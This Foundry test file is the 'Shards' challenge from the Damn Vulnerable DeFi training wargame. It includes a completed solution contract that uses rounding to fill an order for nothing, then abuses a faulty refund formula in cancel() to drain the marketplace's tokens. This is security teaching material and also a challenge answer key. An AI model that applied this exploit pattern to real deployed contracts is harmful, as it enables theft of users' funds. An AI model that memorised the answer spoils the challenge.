// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {
    ShardsNFTMarketplace,
    IShardsNFTMarketplace,
    ShardsFeeVault,
    DamnValuableToken,
    DamnValuableNFT
} from "../../src/shards/ShardsNFTMarketplace.sol";
import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";

contract ShardsChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address seller = makeAddr("seller");
    address oracle = makeAddr("oracle");
    address recovery = makeAddr("recovery");

    uint256 constant STAKING_REWARDS = 100_000e18;
    uint256 constant NFT_SUPPLY = 50;
    uint256 constant SELLER_NFT_BALANCE = 1;
    uint256 constant SELLER_DVT_BALANCE = 75e19;
    uint256 constant STAKING_RATE = 1e18;
    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
    uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
    uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;

    DamnValuableToken token;
    DamnValuableNFT nft;
    ShardsFeeVault feeVault;
    ShardsNFTMarketplace marketplace;
    DamnValuableStaking staking;

    uint256 initialTokensInMarketplace;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy NFT contract and mint initial supply
        nft = new DamnValuableNFT();
        for (uint256 i = 0; i < NFT_SUPPLY; i++) {
            if (i < SELLER_NFT_BALANCE) {
                nft.safeMint(seller);
            } else {
                nft.safeMint(deployer);
            }
        }

        // Deploy token (used for payments and fees)
        token = new DamnValuableToken();

        // Deploy NFT marketplace and get the associated fee vault
        marketplace =
            new ShardsNFTMarketplace(nft, token, address(new ShardsFeeVault()), oracle, MARKETPLACE_INITIAL_RATE);
        feeVault = marketplace.feeVault();

        // Deploy DVT staking contract and enable staking of fees in marketplace
        staking = new DamnValuableStaking(token, STAKING_RATE);
        token.transfer(address(staking), STAKING_REWARDS);
        marketplace.feeVault().enableStaking(staking);

        // Fund seller with DVT (to cover fees)
        token.transfer(seller, SELLER_DVT_BALANCE);

        // Seller opens offers in the marketplace
        vm.startPrank(seller);
        token.approve(address(marketplace), SELLER_DVT_BALANCE); // for fees
        nft.setApprovalForAll(address(marketplace), true);
        for (uint256 id = 0; id < SELLER_NFT_BALANCE; id++) {
            marketplace.openOffer({nftId: id, totalShards: NFT_OFFER_SHARDS, price: NFT_OFFER_PRICE});
        }

        initialTokensInMarketplace = token.balanceOf(address(marketplace));

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(feeVault.owner(), deployer);
        assertEq(address(feeVault.token()), address(token));
        assertEq(address(feeVault.staking()), address(staking));

        assertEq(nft.balanceOf(deployer), NFT_SUPPLY - SELLER_NFT_BALANCE);
        assertEq(nft.balanceOf(address(marketplace)), marketplace.offerCount());
        assertEq(marketplace.offerCount(), SELLER_NFT_BALANCE);
        assertEq(marketplace.rate(), MARKETPLACE_INITIAL_RATE);
        assertGt(marketplace.feesInBalance(), 0);
        assertEq(token.balanceOf(address(marketplace)), marketplace.feesInBalance());

        assertEq(staking.rate(), STAKING_RATE);
        assertEq(staking.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS);
        assertEq(token.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_shards() public checkSolvedByPlayer {
        new ShardsAttacker(token, marketplace, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Balance of staking contract didn't change
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS, "Not enough tokens in staking rewards");

        // Marketplace has less tokens
        uint256 missingTokens = initialTokensInMarketplace - token.balanceOf(address(marketplace));
        assertGt(missingTokens, initialTokensInMarketplace * 1e16 / 100e18, "Marketplace still has tokens");

        // All recovered funds sent to recovery account
        assertEq(token.balanceOf(recovery), missingTokens, "Not enough tokens in recovery account");
        assertEq(token.balanceOf(player), 0, "Player still has tokens");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1);
    }
}

contract ShardsAttacker {
    constructor(DamnValuableToken token, ShardsNFTMarketplace marketplace, address recovery) {
        uint64 offerId = 1;

        // 1) Create a purchase that costs 0 due to mulDivDown rounding, then cancel immediately.
        //    This yields a (non-zero) refund due to the incorrect refund formula in `cancel()`.
        uint256 seedWant = 133; // max that still pays 0 in this setup
        marketplace.fill(offerId, seedWant);
        marketplace.cancel(offerId, 0);

        // 2) Use the refunded DVT as seed to pay a second purchase, then cancel it to drain the marketplace.
        token.approve(address(marketplace), type(uint256).max);

        uint256 balance = token.balanceOf(address(marketplace));
        uint256 rate = marketplace.rate();

        // Choose `want` so that refund ~= current marketplace balance.
        // refund = ceil(want * rate / 1e6) <= balance when want = floor(balance * 1e6 / rate)
        uint256 want = (balance * 1e6) / rate;
        marketplace.fill(offerId, want);
        marketplace.cancel(offerId, 1);

        // 3) Forward all extracted tokens to the recovery account.
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
